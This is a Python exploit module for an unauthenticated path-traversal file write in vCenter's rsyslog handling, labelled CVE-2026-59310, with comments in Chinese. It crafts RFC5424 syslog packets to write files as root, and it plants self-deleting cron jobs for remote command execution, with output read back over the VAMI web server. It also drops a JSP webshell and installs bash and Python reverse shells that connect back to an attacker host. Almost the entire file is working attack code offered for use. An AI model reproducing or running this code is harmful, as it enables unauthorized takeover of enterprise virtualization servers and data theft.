"""CVE-2026-59310 — vCenter rsyslog 路径穿越原语。

原理：/etc/rsyslog.conf 的动态路径模板
    $template rsyslogadminLoc, "/var/log/vmware/%app-name%/%app-name%-syslog.log"
    $template esxLoc,         "/var/log/vmware/esx/%hostname%/%hostname%-syslog.log"
把 RFC5424 报文头 APP-NAME / HOSTNAME 未净化地拼入落盘路径；选择器
    :app-name, startswith, "rsyslog"
仅需前缀命中；$EscapeControlCharactersOnReceive off 允许换行穿透。
pmrfc3164 会在 '/' 截断 APP-NAME，而 pmrfc5424 不做字符白名单 —— 遍历得以保留。

两条写入向量：
  app   : APP-NAME = "rsyslog/../../../../../" + <dest>（5 级回根）
  host  : HOSTNAME = "../"*16 + <dest>（mobeta 向量，esxLoc 模板）
文件名固定追加 "-syslog.log" 后缀；内容前导 \n 使可控行落第 0 列。
"""
import base64
import socket
import ssl
import time

import urllib.request
import urllib.error

SYSLOG_PRI = "<134>"
UP5 = "rsyslog/../../../../../"          # APP-NAME 向量（模板目录 /var/log/vmware/<app>/）
UP16 = "../" * 16                         # HOSTNAME 向量（esxLoc 模板）
CRON_WAIT_FIRST = 54                      # crond 分钟粒度，先等再轮询


def build_rfc5424(hostname, app, msg, pri=SYSLOG_PRI, ts=None):
    if ts is None:
        ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    return ("%s1 %s %s %s 1 ID47 - %s\n" % (pri, ts, hostname, app, msg)).encode(
        "latin-1", "replace")


def syslog_send(host, port, payload, tcp=False, tls=False, timeout=8):
    if not tcp:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        try:
            s.sendto(payload, (host, port))
        finally:
            s.close()
        return
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.settimeout(timeout)
        if tls:
            # vCenter 出厂自签证书，测试工具按惯例不校验
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(payload)
    finally:
        try:
            s.close()
        except Exception:
            pass


def traversal_app(dest):
    """APP-NAME 向量：命中 :app-name, startswith, "rsyslog" 选择器。"""
    return UP5 + dest.lstrip("/")


def traversal_host(dest):
    """HOSTNAME 向量：命中 hostname != myhostname 规则（esxLoc 模板）。"""
    return UP16 + dest.lstrip("/")


def write_file(host, port, dest, content, vector="app", tcp=False, tls=False,
               hostname="h", pri=SYSLOG_PRI, timeout=8):
    """
    任意路径文件写（root 属主；文件名自动追加 -syslog.log 后缀）。
    内容前置换行、尾部 '#'，保证可控行结构（兼容 cron/JSP 等落地）。
    """
    dest = dest.lstrip("/")
    if vector == "app":
        app, hostn = traversal_app(dest), hostname
    else:
        hostn, app = traversal_host(dest), "probe"
    msg = "\n" + content.rstrip("\n") + "\n#"
    pkt = build_rfc5424(hostn, app, msg, pri=pri)
    syslog_send(host, port, pkt, tcp=tcp, tls=tls, timeout=timeout)
    return "/" + dest + "-syslog.log", pkt


def check_write(host, port, name, tcp=False, tls=False, timeout=8):
    """非破坏验证：写 /tmp/cve59310_check_<name>-syslog.log。"""
    dest = "tmp/cve59310_check_%s" % name
    pkt = build_rfc5424("h", traversal_app(dest), "unauthenticated_write_proof")
    syslog_send(host, port, pkt, tcp=tcp, tls=tls, timeout=timeout)
    return "/tmp/cve59310_check_%s-syslog.log" % name, pkt


def cron_command(body, name, prefix="cve59310"):
    """一次性自毁 cron 命令：执行前先删除自身（cron 文件 + rsyslog 动态模板
    自动创建的同名目录）。

    cron 行是每分钟触发，若不删除自身，反弹 shell 会每分钟重连一次造成
    会话雪崩（多次植入的旧 cron 叠加后更甚）——一次性化是 GUI 多会话场景
    的必要约束，行为上等价于"每次动作 = 一次触发"。
    """
    cron_file = "/etc/cron.d/%s%s-syslog.log" % (prefix, name)
    cron_dir = "/etc/cron.d/%s%s" % (prefix, name)
    return 'rm -rf "%s" "%s"; %s' % (cron_file, cron_dir, body)


def plant_cron(host, port, body, name, prefix="cve59310", tcp=False, tls=False,
               timeout=8):
    """植入一次性自毁计划任务 /etc/cron.d/<prefix><name>-syslog.log。"""
    dest = "etc/cron.d/%s%s" % (prefix, name)
    app = traversal_app(dest)
    msg = "\n* * * * * root %s\n#" % cron_command(body, name, prefix)
    pkt = build_rfc5424("h", app, msg)
    syslog_send(host, port, pkt, tcp=tcp, tls=tls, timeout=timeout)
    return "/etc/cron.d/%s%s-syslog.log" % (prefix, name), pkt


def vami_fetch(host, path, port=5480, timeout=8, proxy=None):
    """读取 VAMI(lighttpd) 静态资源 —— 59310 的回显通道。仅 http/https。"""
    url = "https://%s:%d/%s" % (host, port, path.lstrip("/"))
    ctx = ssl._create_unverified_context()
    handlers = [urllib.request.ProxyHandler(
        {"http": proxy, "https": proxy} if proxy else {})]
    opener = urllib.request.build_opener(*handlers,
                                         urllib.request.HTTPSHandler(context=ctx))
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (VC-Strike)"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, url, r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, b""
    except Exception as e:
        return None, url, str(e).encode()


def rce_readback(host, port, cmd, tag, tcp=False, tls=False, vami_port=5480,
                 timeout=240, proxy=None, use_b64=True, poll_cb=None,
                 stop_flag=None):
    """
    RCE + 回显：cron 执行命令 → 输出重定向到 VAMI 静态目录 → HTTP 读回。
    返回 (ok, text)。
    """
    out = "/opt/vmware/share/htdocs/r%s.txt" % tag
    if use_b64:
        b64 = base64.b64encode(cmd.encode()).decode()
        body = "/bin/sh -c 'echo %s | base64 -d | /bin/sh > %s 2>&1'" % (b64, out)
    else:
        body = "/bin/sh -c '{ %s; } > %s 2>&1'" % (cmd.replace("'", "'\\''"), out)
    planted, _ = plant_cron(host, port, body, tag, tcp=tcp, tls=tls)
    if poll_cb:
        poll_cb("[+] 已植入 %s，等待 crond 触发（约 60s）…" % planted)
    deadline = time.time() + timeout
    time.sleep(CRON_WAIT_FIRST)
    while time.time() < deadline:
        if stop_flag is not None and stop_flag.is_set():
            return False, "已取消"
        st, url, body_b = vami_fetch(host, "r%s.txt" % tag, vami_port, timeout=8,
                                     proxy=proxy)
        if st == 200:
            return True, body_b.decode("utf-8", "replace")
        if poll_cb:
            poll_cb("[*] 轮询 %s → %s" % (url, st))
        time.sleep(6)
    return False, "超时未读到回显（目标已修复 / VAMI 不可达 / 命令未执行）"


WEBSHELL_JSP = (
    b'<%@page import="java.util.*,java.io.*"%><%\n'
    b'String c=request.getParameter("c");String d=request.getParameter("d");\n'
    b'if(c!=null){File wd=(d!=null&&d.length()>0)?new File(d):null;\n'
    b'ProcessBuilder pb=new ProcessBuilder(Arrays.asList(new String[]{"/bin/bash","-c",c}));\n'
    b'if(wd!=null){try{pb.directory(wd);}catch(Exception e){}}\n'
    b'pb.redirectErrorStream(true);Process p=pb.start();\n'
    b'BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
    b'StringBuilder sb=new StringBuilder();String l;\n'
    b'while((l=r.readLine())!=null)sb.append(l).append("\\n");out.print(sb.toString());}\n'
    b'%>'
)


def drop_webshell(host, port, name, tcp=False, tls=False, timeout=8):
    """
    落地 JSP webshell：
      ① syslog 写 /tmp/ws<name>-syslog.log（内容为 JSP）
      ② cron 复制为 perfcharts statsreport webapp 下的 .jsp
    返回 (写入文件, cron 文件, 访问 URL 列表)。
    """
    tmp = "/tmp/ws%s" % name
    written, _ = write_file(host, port, tmp, WEBSHELL_JSP.decode(), vector="app",
                            tcp=tcp, tls=tls, timeout=timeout)
    body = ("/bin/sh -c 'cp /tmp/ws%s-syslog.log "
            "/usr/lib/vmware-perfcharts/tc-instance/webapps/statsreport/%s.jsp "
            "2>/dev/null;"
            "cp /tmp/ws%s-syslog.log "
            "/usr/lib/vmware-perfcharts/webapps/statsreport/%s.jsp 2>/dev/null'"
            % (name, name, name, name))
    planted, _ = plant_cron(host, port, body, "ws" + name, tcp=tcp, tls=tls,
                            timeout=timeout)
    urls = ["https://%s/statsreport/%s.jsp?c=id" % (host, name)]
    return written, planted, urls


REVSH_BASH = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
REVSH_PY = ("python3 -c 'import socket,subprocess,os;s=socket.socket();"
            "s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            "subprocess.call([\"/bin/bash\",\"-i\"])'")


def plant_revshell(host, port, lhost, lport, method="bash", name=None,
                   tcp=False, tls=False, timeout=8):
    """植入反弹 shell 的 cron 载荷（监听端见 c2 模块）。

    载荷整体 base64 封装后经 /bin/bash 执行：python 载荷内含单/双引号，
    直接嵌进 cron 第 6 列会被 shell 错误切分；b64 字符集引号安全。
    """
    if name is None:
        from .util import rand_name
        name = rand_name()
    tmpl = REVSH_BASH if method == "bash" else REVSH_PY
    payload = tmpl.format(lhost=lhost, lport=lport)
    b64 = base64.b64encode(payload.encode()).decode()
    body = "/bin/sh -c 'echo %s | base64 -d | /bin/bash'" % b64
    return plant_cron(host, port, body, name, tcp=tcp, tls=tls, timeout=timeout)
